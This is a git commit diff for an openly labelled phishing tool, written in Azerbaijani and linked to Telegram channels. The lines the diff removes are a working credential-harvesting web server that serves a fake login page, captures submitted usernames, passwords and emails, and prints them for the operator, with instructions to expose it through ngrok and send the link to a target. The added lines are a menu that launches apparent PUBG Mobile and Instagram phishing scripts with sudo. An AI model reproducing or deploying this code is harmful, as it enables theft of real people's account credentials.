d386de57062b1df037bf940fe97311dc3a556495
m3m3nt9m9ri <135467842+m3m3nt9m9ri@users.noreply.github.com>
2023-08-08 12:02:00 -0400

    Update and rename phsng.py to start.py

--- start.py
+++ start.py
@@ -1,12 +1,10 @@
-#Ne gezirsen burda???? Kodlari ogurlamaqa gelmisen???
-
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import urllib.parse
 import os
+import signal
+import sys
 os.system("clear")
-print("""
+banner = """
 
-\033[31m
+\033[1;31m
    █████████             █████                        ██████████                       █████     
   ███░░░░░███           ░░███                        ░░███░░░░███                     ░░███      
  ███     ░░░  █████ ████ ░███████   ██████  ████████  ░███   ░░███  ██████   ████████  ░███ █████
@@ -18,7 +16,7 @@ print("""
                ███ ░███                                                                          
               ░░██████                                                       <> Phising <>                 
               ░░░░░░           
-                          \033[32m                   Version 0.1
+                         \033[1;34m                  Version 0.2 
                                #######################################
                                #    <>Developer By m3m3nt9m9ri<>     #
                                #                                     #
@@ -26,74 +24,40 @@ print("""
                                #            gözləyirik <>            #
                                #                                     #
                                #######################################
-                                 <>   https://t.me/cyberdarkk     <>
-                                 <>   https://t.me/istiklal_team  <>
- 
-\033[33m
-Ngrok istifadə edərək 8000 portunu dinləməyə alın və ngrokun
-verdiyi url hədəfə atın
-
-\033[32m
-
-""")
-class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == '/':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html; charset=utf-8')
-            self.end_headers()
-
-            with open('index.html', 'r', encoding='utf-8') as file:
-                content = file.read()
-
-            self.wfile.write(content.encode('utf-8'))
-        else:
-            self.send_error(404)
-
-    def do_POST(self):
-        if self.path == '/login':
-            try:
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length)
-                post_data = post_data.decode('utf-8')
-
-                parsed_data = urllib.parse.parse_qs(post_data)
-                username = parsed_data.get('username', [''])[0]
-                password = parsed_data.get('password', [''])[0]
-                email = parsed_data.get('email', [''])[0]
-
+                                <>   https://t.me/cyberdarkk     <>
+                                <>   https://t.me/istiklal_team  <>
             
-                print(f"\033[34m***İstifadəçi adı: {username}")
-                print(f"\033[34m***Parol: {password}")
-                print(f"\033[34m***E-mail: {email}")
+            """
+print(banner)
 
-                self.send_response(302)
-                self.send_header('Location', '/?message=Data%20b%yadda saxanıldı!')
-                self.send_header('Content-type', 'text/html; charset=utf-8')
-                self.end_headers()
+def main_menu():
+    print("\033[1;31m[1]. \033[32mPubg Mobile")
+    print("\033[1;31m[2]. \033[32mİnstagram\n\n\n\n")
+    choice = input("----| Seçim edin: ")
+    return choice
 
-            except Exception as e:
-                self.send_error(500)
+def run_first_code():
+    os.system("sudo python3 Pmobile.py")
+    os.system("clear")
+    print(banner)
 
-        else:
-            self.send_error(404)
+def run_second_code():
+    os.system("sudo python3 İnstagram.py")
+    os.system("clear")
+    print(banner)
 
-    def log_message(self, format, *args):
-        pass
-    
-        
-def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
-    server_address = ('', 8000)
-    httpd = server_class(server_address, handler_class)
-    print('Server başladıldı...')
-    print(""" 
-                                                          <> Nəticə <>
----------------------------------------------------------------------------------------------------------------------------------------------------
+def signal_handler(sig, frame):
+    print("\n\nTool dayandırıldı...")
+    sys.exit(0)
 
-    """)
-    httpd.serve_forever()
-
+signal.signal(signal.SIGINT, signal_handler)
 if __name__ == '__main__':
-    run()
+    while True:
+        choice = main_menu()
 
-
+        if choice == '1':
+            run_first_code()
+        elif choice == '2':
+            run_second_code()
+        else:
+            print("\n\n\n\033[1;31mDüzgün seçim edin 1 və ya 2\n\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n")
